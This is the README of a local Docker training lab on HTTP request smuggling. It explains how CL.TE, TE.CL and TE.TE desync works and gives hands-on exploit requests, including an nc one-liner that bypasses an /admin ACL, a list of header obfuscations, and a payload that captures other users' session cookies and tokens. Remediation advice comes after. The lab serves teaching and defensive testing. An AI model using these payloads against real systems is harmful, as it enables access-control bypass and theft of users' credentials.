# HTTP Request Smuggling (HTTP Desync Attacks) Lab

## Overview

**HTTP Request Smuggling** (also known as _HTTP Desync Attacks_) is an advanced server-side vulnerability that arises when a front-end reverse proxy (load balancer, CDN, or API gateway) and a back-end web server interpret the boundaries of HTTP requests differently.

When multiple HTTP requests are multiplexed or pipelined over a single persistent TCP connection (`Connection: keep-alive`), ambiguities between the `Content-Length` (CL) and `Transfer-Encoding` (TE) headers cause one server to determine the request length differently from the other. This desynchronization allows an attacker to "smuggle" an arbitrary HTTP prefix into the back-end connection pool, prepending malicious data to the subsequent request of an unsuspecting victim or bypassing front-end security controls.

- **Lab Frontend URL**: [http://localhost:8108](http://localhost:8108)
- **Frontend Proxy**: HAProxy (`haproxy:alpine`) on Port `8108`
- **Backend Service**: Desync-Vulnerable HTTP Server (`cyberlab_smuggling_backend`) on Port `8000` (Internal)
- **Container Names**: `cyberlab_02_smuggling_frontend`, `cyberlab_02_smuggling_backend`
- **Directory**: `Classes/02_web_penetration_tester/09_http_request_smuggling/request_smuggling_lab`
- **Lab Shortcut**: `./lab start smuggling`

---

## Architecture & Desynchronization Mechanics

```
                       +-------------------------------------------------------------+
                       |              Attacker / Client HTTP Stream                  |
                       +------------------------------+------------------------------+
                                                      |
                                                      v
                                    +-----------------------------------+
                                    |     Front-End Reverse Proxy       |
                                    |     (HAProxy on Port 8108)        |
                                    +-----------------+-----------------+
                                                      |  Reused Keep-Alive Connection Pool
                                                      v
                                    +-----------------------------------+
                                    |      Back-End Target Server       |
                                    |     (Internal on Port 8000)       |
                                    +-----------------+-----------------+
                                                      |
                         +----------------------------+----------------------------+
                         |                                                         |
                         v                                                         v
         [ Scenario 1: CL.TE Desync ]                             [ Scenario 2: TE.CL Desync ]
         - Frontend uses Content-Length                           - Frontend uses Transfer-Encoding
         - Backend uses Transfer-Encoding                         - Backend uses Content-Length
         - Smuggled suffix stays in buffer                        - Smuggled body prefixes victim
```

### The RFC 7230 Conflict & Root Cause

According to **RFC 7230 section 3.3.3**, if a request contains both `Transfer-Encoding: chunked` and a `Content-Length` header, `Transfer-Encoding` MUST take precedence, and `Content-Length` MUST be ignored.

However, vulnerabilities arise when:

1. One server supports `Transfer-Encoding: chunked`, but the other server does not or ignores it.
2. The `Transfer-Encoding` header is subtly obfuscated so that one server parses it while the other fails to recognize it and falls back to `Content-Length`.
3. The front-end forwards both headers unchanged over a shared keep-alive backend socket pool (`http-reuse always`).

---

## Lab Execution & Quick Start

```bash
# Navigate to the request smuggling directory
cd Classes/02_web_penetration_tester/09_http_request_smuggling/request_smuggling_lab

# Launch the multi-tier container environment
docker compose up -d

# Verify frontend is active
curl -i http://localhost:8108/

# Verify front-end ACL blocks direct access to /admin
curl -i http://localhost:8108/admin
```

Observe that direct requests to `/admin` return `403 Forbidden` from HAProxy!

---

## Step-by-Step Hands-On Exploits

### Exploit 1: CL.TE Desync (Bypassing Front-End ACL for /admin)

In a **CL.TE** vulnerability:

- The **Front-End** uses the `Content-Length` header.
- The **Back-End** uses the `Transfer-Encoding` header.

#### Exploitation Flow:

1. Ensure the backend is in `CL.TE` mode (default, or visit `http://localhost:8108/mode/toggle`).
2. Construct a request containing both `Content-Length` and `Transfer-Encoding: chunked`:
   - The `Content-Length` is calculated to cover the entire body, including the smuggled request.
   - The chunked body terminates early with a chunk length of `0` (`0\r\n\r\n`).
   - The smuggled `GET /admin HTTP/1.1` prefix follows the terminal chunk.

```http
POST / HTTP/1.1
Host: localhost:8108
Content-Type: application/x-www-form-urlencoded
Content-Length: 46
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost:8108
Foo: x
```

#### Executing via Raw TCP / Netcat:

```bash
printf "POST / HTTP/1.1\r\n"\
"Host: localhost:8108\r\n"\
"Content-Type: application/x-www-form-urlencoded\r\n"\
"Content-Length: 46\r\n"\
"Transfer-Encoding: chunked\r\n"\
"\r\n"\
"0\r\n"\
"\r\n"\
"GET /admin HTTP/1.1\r\n"\
"Host: localhost:8108\r\n"\
"Foo: x" | nc -q 1 127.0.0.1 8108
```

#### What Happens on the Wire:

1. HAProxy reads 46 bytes of body as indicated by `Content-Length`. It considers the entire block as one legitimate request to `/` (allowed by ACL).
2. HAProxy forwards the entire payload to the backend over the reused keep-alive connection.
3. The backend parses `Transfer-Encoding: chunked`. It reads `0\r\n\r\n`, terminating the first request, and responds to HAProxy.
4. The remaining bytes (`GET /admin HTTP/1.1\r\nHost: localhost:8108\r\nFoo: x`) remain unconsumed inside the backend's persistent connection buffer.
5. The very next request arriving on that connection (e.g., `GET / HTTP/1.1`) is appended to `Foo: xGET / HTTP/1.1...`, causing the backend to execute the smuggled `GET /admin HTTP/1.1` request!
6. Send a second simple request:
   ```bash
   curl -i http://localhost:8108/
   ```
7. The response reflects the contents of `/admin`:
   ```text
   HTTP/1.1 200 OK
   Content-Type: text/html; charset=utf-8

   <h1>Access Granted: Admin Control Center</h1>
   FLAG{http_request_smuggling_desync_master_8108}
   ```

---

### Exploit 2: TE.CL Desync

In a **TE.CL** vulnerability:

- The **Front-End** uses the `Transfer-Encoding` header.
- The **Back-End** uses the `Content-Length` header.

#### Exploitation Flow:

1. Toggle the backend mode to `TE.CL`:
   ```bash
   curl http://localhost:8108/mode/toggle
   ```
2. Construct the exploit payload:
   ```http
   POST / HTTP/1.1
   Host: localhost:8108
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 4
   Transfer-Encoding: chunked

   5c
   GPOST /admin HTTP/1.1
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 15

   x=1
   0


   ```
3. The front-end parses the chunked data and forwards everything to the backend.
4. The backend only reads 4 bytes (`5c\r\n`) as dictated by `Content-Length: 4`.
5. The rest of the chunked body (`GPOST /admin HTTP/1.1...`) remains in the socket buffer.
6. When the victim sends `POST /login`, it gets appended to `GPOST /admin...`, causing an unauthorized admin action or error!

---

### Exploit 3: TE.TE Header Obfuscation

When both front-end and back-end support `Transfer-Encoding`, an attacker obfuscates the header so that one server rejects or ignores it, while the other processes it:

```http
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: identity

Transfer-Encoding:[tab]chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-encoding:
 chunked
```

If the front-end normalizes or ignores the obfuscated header (falling back to `Content-Length`), while the back-end leniently parses it as chunked, the system degrades to a **CL.TE** vulnerability. If the reverse occurs, it degrades to **TE.CL**.

---

### Exploit 4: Request Pipeline Hijacking (Capturing Other Users' Requests)

Request smuggling can be weaponized to steal session cookies, API tokens, and internal headers of other users navigating the site:

1. Locate a storage/reflection endpoint, such as `/comment`.
2. Smuggle an incomplete `POST /comment` request with a large `Content-Length` (e.g., `Content-Length: 800`):
   ```http
   POST / HTTP/1.1
   Host: localhost:8108
   Transfer-Encoding: chunked
   Content-Length: 120

   0

   POST /comment HTTP/1.1
   Host: localhost:8108
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 800

   comment=
   ```
3. When the simulated victim background worker sends its periodic request:
   ```http
   GET / HTTP/1.1
   Host: localhost:8108
   Cookie: session=SUPER_SECRET_ADMIN_TOKEN_XYZ_8108; role=admin
   Authorization: Bearer eyJhbGciOiJIUzI1Ni...
   ```
4. The victim's entire request gets appended to `comment=` because the backend is waiting for 800 bytes!
5. Navigate to [http://localhost:8108/comments](http://localhost:8108/comments) in your browser:
   Inspect the captured comments to extract the victim's session tokens and authentication headers!

---

## Defensive Engineering & Remediation

1. **HTTP/2 End-to-End**:
   Migrate all communication between clients, CDNs, load balancers, and backends to HTTP/2. HTTP/2 uses binary framing with explicit length fields, eliminating text-based delimiter ambiguity.
   _(Note: Avoid front-end HTTP/2 downgrading to backend HTTP/1.1 without strict header sanitization, as H2.CL / H2.TE desync can still occur)._
2. **Strict RFC 7230 Compliance**:
   Configure front-end proxies to normalize or reject any request containing both `Content-Length` and `Transfer-Encoding` with `400 Bad Request`.
3. **Disable Connection Reuse (Connection Pooling)**:
   Avoid reusing backend TCP connections across distinct client sessions (`http-reuse never` in HAProxy). While this incurs a minor latency overhead, it prevents cross-tenant request prefix injection.
4. **Web Application Firewall (WAF) Validation**:
   Enforce strict byte validation on header names and values to block control character obfuscation (tabs, carriage returns, spaces before colons).

---

## Verified YouTube Walkthroughs & Lectures

All video links verified active via YouTube oEmbed API (`HTTP 200 OK`):

- [DEFCONConference - albinowax - HTTP Desync Attacks: Smashing into the Cell Next Door - DEF CON 27 Conference](https://www.youtube.com/watch?v=w-eJM2Pc0KI) — The original breakthrough presentation by James Kettle demonstrating real-world HTTP request smuggling and desync primitives.
- [NahamSec - HTTP Request Smuggling Explained (with James Kettle)](https://www.youtube.com/watch?v=QjPFjd8GJWY) — Practical breakdown and discussion with James Kettle explaining CL.TE and TE.CL mechanics for bug bounty hunters.
- [PwnFunction - Don't make random HTTP requests.](https://www.youtube.com/watch?v=RCJdPiogUIk) — Beautifully animated visual explanation of request pipelining, chunked encoding, and pipeline desynchronization.
- [Off By One Security - Novel HTTP/1 Request Smuggling/Desync Attacks with James Kettle](https://www.youtube.com/watch?v=B7p8dIB7bFg) — Deep-dive technical seminar exploring advanced HTTP/1 and HTTP/2 desync techniques.
- [Mohd Badrudduja - HTTP request smuggling, confirming a CL.TE vulnerability via differential responses - Lab#01](https://www.youtube.com/watch?v=o8IBMWr-drg) — Step-by-step Burp Suite demonstration solving PortSwigger CL.TE labs.

---

## Quick CLI Control

From the `cyber_lab` root directory:

```bash
# Start HTTP Request Smuggling lab
./lab start smuggling

# Check status
./lab status

# Open interactive shell in backend
./lab shell smuggling

# Stop the lab
./lab stop smuggling
```
